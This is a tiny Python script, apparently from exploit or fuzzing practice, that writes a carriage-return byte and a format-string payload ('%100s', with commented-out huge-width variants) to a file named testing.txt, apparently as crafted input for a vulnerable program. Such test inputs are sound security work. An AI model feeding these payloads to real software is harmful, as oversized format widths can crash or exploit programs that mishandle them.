#!/bin/python3

pwn = b"\x0d"

# payload = "%1000000000s"

# payload = "%100000000000s"

payload = "%100s"

pwn = pwn + payload.encode("ascii")

fh = open("testing.txt", "wb")
fh.write(pwn)
fh.close()

